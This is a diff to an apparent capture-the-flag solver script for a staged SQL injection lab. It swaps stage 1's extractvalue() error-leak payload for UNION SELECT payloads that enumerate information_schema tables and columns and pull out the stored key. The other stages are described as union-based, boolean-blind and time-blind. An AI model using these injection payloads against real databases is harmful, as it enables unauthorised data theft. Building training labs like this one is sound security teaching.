@@ -9,7 +9,9 @@ parameterized lookup in challenges/finals.py's _stage_key()). There is no
 shortcut, the only way to ever learn a stage's key is to run that
 stage's own technique against that stage's own seeded bookhaven_key_N table:
 
-  Stage 1 (error-based):   extractvalue() leaks stage 1's key in a DBMS error.
+  Stage 1 (union-based):   enumerate information_schema (no table name
+                            guessed) to find the key table, then UNION
+                            SELECT stage 1's key out. No error-leak channel.
   Stage 2 (union-based):   a UNION SELECT matching the 3-column result set
                             pulls stage 2's key out as an ordinary-looking row.
   Stage 3 (boolean-blind): a PASS/FAIL-only oracle, walked char-by-char via
@@ -25,6 +27,7 @@ flag.
 from __future__ import annotations
 
 import os
+import re
 import sys
 import time
 
@@ -48,31 +51,51 @@ SLEEP_SECONDS = 0.35
 THRESHOLD_SECONDS = 0.6
 
 
-def stage1_error_based() -> str:
-    """Extract stage 1's key via a MariaDB extractvalue() error leak,
-    identical technique to Phase 1's Netero's Recipe Vault (p1_2)."""
-    payload = (
-        "1' AND extractvalue(1,concat(0x3a,"
-        "(SELECT key_value FROM bookhaven_key_1)))-- -"
-    )
+def _stage1_title(payload: str) -> str:
+    """Run one injection against stage 1 and return the single value it
+    renders into the catalogue's `title` field."""
     resp = requests.get(
         f"{BASE}/f/bookhaven/stage1", params={"id": payload}, timeout=10
     )
     resp.raise_for_status()
-    body = resp.text
-    # extractvalue()'s XPATH error embeds the leaked value after a ':'
-    # separator, inside the exception text rendered onto the page. Jinja
-    # auto-escapes the surrounding quotes as HTML entities (&#39;), same
-    # as p1_2's template.
-    marker = "XPATH syntax error: &#39;"
-    idx = body.find(marker)
-    if idx == -1:
-        raise RuntimeError("stage 1: extractvalue() marker not found in response")
-    tail = body[idx + len(marker):]
-    leaked = tail.split("&#39;", 1)[0]
-    key = leaked.lstrip(":")
+    # template: `title&gt;</p>` then `<p class="... break-all">VALUE</p>`
+    m = re.search(r"title&gt;</p>\s*<p[^>]*>([^<]*)</p>", resp.text)
+    if not m:
+        raise RuntimeError(f"stage 1: no title rendered for payload {payload!r}")
+    return m.group(1).strip()
+
+
+def stage1_union_based() -> str:
+    """Recover stage 1's key with union-based injection and schema
+    enumeration, no table name guessed or hardcoded.
+
+    Stage 1 echoes no raw DBMS errors, so error-based extraction has no
+    channel; the single-column SELECT it renders is union-injectable. The
+    table name is *discovered*, not assumed: stage 1's least-privileged DB
+    user can see only bookhaven_catalog and its own key table in
+    information_schema, so enumeration names the key table unambiguously.
+
+      1. enumerate the tables this door's user can see
+      2. enumerate the key table's column
+      3. UNION SELECT the value out
+    """
+    tables = _stage1_title(
+        "nonexistent' UNION SELECT GROUP_CONCAT(table_name) "
+        "FROM information_schema.tables WHERE table_schema=database()-- -"
+    )
+    key_tables = [t for t in tables.split(",") if t and t != "bookhaven_catalog"]
+    if not key_tables:
+        raise RuntimeError(f"stage 1: no key table enumerated (saw {tables!r})")
+    table = key_tables[0]
+
+    column = _stage1_title(
+        "nonexistent' UNION SELECT GROUP_CONCAT(column_name) "
+        f"FROM information_schema.columns WHERE table_name='{table}'-- -"
+    ).split(",")[0]
+
+    key = _stage1_title(f"nonexistent' UNION SELECT {column} FROM {table}-- -")
     if not key:
-        raise RuntimeError("stage 1: leaked an empty key")
+        raise RuntimeError("stage 1: union extraction returned empty")
     return key
 
 
@@ -225,8 +248,8 @@ def stage4_time_blind(stage3_key: str) -> str:
 def main() -> int:
     print(f"[f1] target: {BASE}/f/bookhaven")
 
-    print("[f1] stage 1, error-based extraction of stage 1's key")
-    stage1_key = stage1_error_based()
+    print("[f1] stage 1, union-based extraction of stage 1's key (schema enumeration)")
+    stage1_key = stage1_union_based()
     print(f"  ok: stage 1 key = {stage1_key!r}")
 
     print("[f1] stage 2, union-based extraction of stage 2's key")
